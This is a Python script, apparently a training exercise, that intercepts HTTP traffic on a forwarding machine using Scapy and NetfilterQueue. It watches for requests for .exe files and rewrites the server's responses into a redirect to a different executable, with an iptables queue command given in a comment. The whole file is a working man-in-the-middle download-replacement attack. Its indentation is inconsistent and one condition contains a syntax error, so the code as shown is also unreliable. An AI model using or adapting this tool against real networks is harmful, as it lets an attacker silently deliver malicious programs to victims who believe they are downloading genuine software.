import scapy.all as scapy
from netfilterqueue import NetfilterQueue

ack_list = []

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
	    #we check if its a .exe and if it is not our .exe to avoid infinite loops	
            if ".exe" in scapy_packet[scapy.Raw].load and "https://www.rarlab.com" not scapy_packet[scapy.Raw].load:
		print "[+] exe Request"
		#we add the ack number from every request that request a .exe to our list
            	ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
		#we get the response that it's seq match the ack of the request, then we remote it from our list.
		ack_list.remove(scapy_packet[scapy.TCP].seq)
                print "[+] Replacing file"
		#we replace any .exe with the one we want, in our case wrar56b1.exe
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n"
		# we delete len and chksum so scapy will calculate them for our newly created payload.
		del scapy_packet[scapy.IP].len
		del scapy_packet[scapy.TCP].chksum
		del scapy_packet[scapy.IP].chksum
		#we set the payload for the current packet
    		packet.set_payload(str(scapy_packet))
    packet.accept()

    
queue = NetfilterQueue()
queue.bind(0, process_packet)#we bind to a queue this time is the 0 queue
#queues can be made using iptables like so: iptables -I FORWARD -j NFQUEUE --queue-num 0
queue.run()
